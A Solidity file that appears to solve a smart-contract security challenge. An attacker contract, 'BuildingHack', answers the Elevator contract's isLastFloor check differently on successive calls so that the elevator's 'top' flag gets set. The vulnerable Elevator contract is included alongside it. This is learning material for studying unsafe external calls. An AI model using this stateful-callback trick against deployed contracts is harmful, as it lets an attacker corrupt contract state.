// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract BuildingHack {
    bool called;
    function isLastFloor(uint) external returns(bool) {
        if(!called) {
            called = true;
            return false;
        } else {
            return true;
        }
    }

    function start(address elevator) external {
        (bool success, ) = elevator.call(abi.encodeWithSignature("goTo(uint256)", 10));
        require(success);
    }
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}